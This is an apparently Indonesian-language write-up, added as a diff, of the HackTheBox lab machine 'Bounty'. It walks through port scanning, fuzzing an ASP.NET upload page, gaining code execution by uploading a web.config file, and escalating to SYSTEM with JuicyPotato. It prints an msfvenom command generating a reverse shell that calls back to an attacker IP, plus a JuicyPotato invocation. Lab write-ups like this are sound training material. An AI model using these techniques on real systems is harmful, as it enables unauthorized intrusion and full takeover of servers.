@@ -1,0 +1,152 @@
+---
+title: "Bounty"
+platform: "HackTheBox"
+os: "Windows"
+difficulty: "Easy"
+date: 2026-09-15
+encrypted: false
+keyword: ["aspnet", "file upload", "seimpersonate"]
+---
+
+[web.config]: https://jaykiee.medium.com/rce-by-uploading-a-web-config-7390e140a45b
+
+Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.
+
+## Enumeration
+
+### Port Scan
+
+```bash
+$ nmap 10.129.43.161 -p 80 -sCV -oN nmap.txt
+```
+
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Hal pertama yang dilakukan ketika ingin pawnd sebuah mesin adalah dengan melakukan proses enumerasi pada IP yang diberikan, untuk melihat port apa saja yang dibuka. Dengan hasil enumerasi yang memperlihatkan hanya port 80 saja yang terbuka dengan service web versi Microsoft IIS yang menandakan web servernya menggunakan ASP Net. Maka selanjutnya adalah dengan mencoba enumerasi web servicenya jika ada sesuatu hal yang menarik 
+
+### Web Enumeration
+
+![web](/assets/writeup/bounty/web.png)
+
+Pada halaman homepage webnya tidak ditemukan hal yang menarik, karena itu hal yang selanjutnya bisa dilakukan adalah dengan melakukan fuzzing pada web tersebut
+
+```bash
+$ ffuf -u http://10.129.43.161/FUZZ.aspx -w ~/app/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+```
+
+![ffuf](/assets/writeup/bounty/ffuf.png)
+
+Dikarenakan web server yang dibuat ini menggunakan ASP.NET, maka proses fuzzing ini perlu dicoba dengan mencari file .aspx memakai wordlist directories. Hasil fuzzing menemukan adanya sebuah file `transfer.aspx` yang mengarah ke halaman untuk upload file
+
+![transfer.aspx](/assets/writeup/bounty/transfer.png)
+
+## Initial Access
+
+Pada fitur file upload, salah satu cara untuk abusenya adalah dengan mengupload file dengan extension .aspx untuk mendapatkan reverse shell.
+
+```bash
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.5 LPORT=4444 -f aspx -o shell.aspx
+```
+
+![revshell.aspx](/assets/writeup/bounty/revaspx.png)
+
+Dengan menggunakan command msfvenom untuk generate reverse shell, selanjutnya adalah dengan mencoba untuk upload file `shell.aspx` 
+
+![upload.aspx](/assets/writeup/bounty/uploadaspx.png)
+
+Namun pada percobaan upload file dengan extension `.aspx` ini gagal dengan error `Invalid File. Please try again` memberitahu kita tidak bisa upload file tersebut. Selanjutnya adalah dengan mencoba fuzzing file extension yang diperbolehkan menggunakan Burpsuite pada fitur Intruder dengan `positions` berada pada extension file dan payload yang digunakan adalah list extension file, proses fuzzing ini dilakukan untuk melihat file apa saja yang diperbolehkan untuk diupload.
+
+![intruder](/assets/writeup/bounty/intruder.png)
+
+![intruder2](/assets/writeup/bounty/intruder2.png)
+
+Dengan menekan tombol `attack` proses fuzzing dilakukan. Dengan hasil terdapat lima file extension yang bisa diupload pada website tersebut. Pada lima file extension yang bisa diupload, file dengan extension `.config` yang cukup menarik untuk di telusuri lebih lanjut
+
+![fileconfig](/assets/writeup/bounty/fileconfig.png)
+
+Dengan melakukan pencarian di google terkait file extension .config disertakan dengan web framework yang digunakan yaitu `aspnet`, ditemukan sebuah article medium yang memberitahu dengan jelas bahwa bisa dilakukanya RCE dengan mengupload web.config.
+
+![googleconfig](/assets/writeup/bounty/googleconfig.png)
+
+![article](/assets/writeup/bounty/article.png)
+
+Isi dari [article][web.config] tersebut disebutkan kalau file web.config merupakan file yang dapat mempengaruhi perilaku suatu website atau folder, file web.config ini sama halnya dengan file `.htaccess` pada web server linux, namun `web.config` ini hanya berlaku pada web server `asp.net`. Author juga menyebutkan dengan melakukan sedikit perubahan, file `web.config` bisa menjadi file untuk sebuah RCE atau reverse shell. Dengan begitu, dikarenakan tujuan saya adalah untuk mendapatkan reverse shell, sayapun mengubah bagian `whoami` menjadi payload reverse shell.
+
+![reverse shell](/assets/writeup/bounty/revwebconfig.png)
+
+Selanjutnya adalah dengan menyalakan `penelope` untuk menerima koneksi dari reverse shell yang akan dijalankan
+
+```bash
+$ penelope
+```
+
+![penelope](/assets/writeup/bounty/penelope.png)
+
+Setelah mempersiapkan `penelope` untuk menerima koneksi, kita bisa mengupload file `web.config` tadi dan mengaksesnya, untuk mendapatkan reverse shell di `penelope`
+
+![upload web.config](/assets/writeup/bounty/uploadconfig.png)
+
+![access config](/assets/writeup/bounty/accessconfig.png)
+
+![dapat penelope](/assets/writeup/bounty/penel.png)
+
+Pada saat ini, saya berhasil mendapat shell sebagai merlin di mesin bounty dan mendapatkan flag user
+
+**User flag** → `C:\Users\merlin\Desktop\user.txt`
+
+## Privilege Escalation
+
+Setelah mendapatkan akses sebagai user merlin, saya mengecek `privilege` dari user merlin dan menemukan bahwa user merlin memiliki `SeImpersonatePrivilege`, yang mengarah ke salah satu teknik `Privilege Escalation` yang memperbolehkan suatu user menjalankan suatu proses dengan identitas dari user lain. 
+
+```bash
+PS C:\Users\merlin\Desktop> whoami /priv
+```
+
+![seimpersonate](/assets/writeup/bounty/priv.png)
+
+Untuk memanfaatkan kerentanan `SeImpersonatePrivilege` dapat dengan menjalankan program `JuicyPotato.exe`, dikarenakan pada mesin ini server windows menggunakan OS `Windows Server 2008` yang mana ini windows server yang cukup lawas
+
+```bash
+PS C:\Users\merlin\Desktop> systeminfo
+```
+
+![systeminfo](/assets/writeup/bounty/systeminfo.png)
+
+Selanjutnya adalah dengan mengupload dan menjalankan `JuicyPotato.exe` tersebut
+
+![upload juicy](/assets/writeup/bounty/uploadjuicy.png)
+
+dan mengupload shell.exe yang berperan sebagai proses yang akan dijalankan sebagai user lain menggunakan `JuicyPotato.exe`
+
+![upload exe](/assets/writeup/bounty/uploadexe.png)
+
+Setelah mengupload kedua binary tersebut, proses selanjutnya adalah dengan menjalankan `JuicyPotato.exe`
+
+```bash
+PS C:\Users\merlin> .\JuicyPotato.exe -t * -l 1337 -p shell.exe
+```
+
+![run juicy](/assets/writeup/bounty/runpotato.png)
+
+Pada output `JuicyPotato.exe` terlihat bahwa proses menjalankan shell.exe berhasil sebagai user `AUTHORITY\SYSTEM`
+
+Karena program yang dijalankan adalah sebuah reverse shell, maka kita berhasil mendapatkan reverse shell sebagai `AUTHORITY\SYSTEM` dan mendapatkan flag root 
+
+**Root flag** → `C:\Users\Administrator\Desktop\root.txt`
+
+## Summary
+
+| Step | Technique / Target | Details |
+| :--- | :--- | :--- |
+| **Enumeration** | Port Scanning | Found Open Ports: Web (80) |
+| **Web Enumeration** | Fuzzing Files | Found page File Upload |
+| **Initial Access** | web.config File to RCE | Fuzzing extension file → Found .config extension allowed → Upload web.config to gain RCE |
+| **PrivEsc** | SeImpersonatePrivilege | Exploit SeImpersonatePrivilege by run JuicyPotato → Got `AUTHORITY\SYSTEM` shell |
